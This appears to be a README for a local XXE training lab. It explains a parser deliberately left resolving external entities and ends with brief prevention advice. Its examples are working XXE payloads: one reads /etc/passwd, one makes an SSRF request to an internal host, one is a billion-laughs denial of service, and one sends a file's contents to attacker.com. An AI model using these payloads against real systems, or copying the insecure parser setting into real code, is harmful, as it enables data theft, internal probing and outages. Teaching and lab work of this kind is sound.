# XXE (XML External Entity) Lab

## Description
This lab demonstrates XML External Entity (XXE) injection vulnerabilities. The application parses XML input without properly disabling external entity resolution.

## Access
- URL: http://localhost:8090

## Vulnerability Details
The XML parser is configured with `resolve_entities=True`, making it vulnerable to XXE attacks.

## Exploitation Examples

### 1. File Disclosure
Read `/etc/passwd`:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
    <user>&xxe;</user>
    <pass>password</pass>
</data>
```

### 2. SSRF via XXE
Internal network scanning:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://internal-service:80/">
]>
<data>
    <user>&xxe;</user>
</data>
```

### 3. Billion Laughs Attack (DoS)
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<data>
    <user>&lol4;</user>
</data>
```

### 4. Data Exfiltration
Using parameter entities (if supported):
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
  %eval;
  %exfil;
]>
<data>
    <user>test</user>
</data>
```

## Prevention
- Disable DTDs completely: `resolve_entities=False`
- Use defusedxml library
- Input validation
- Least privilege principle 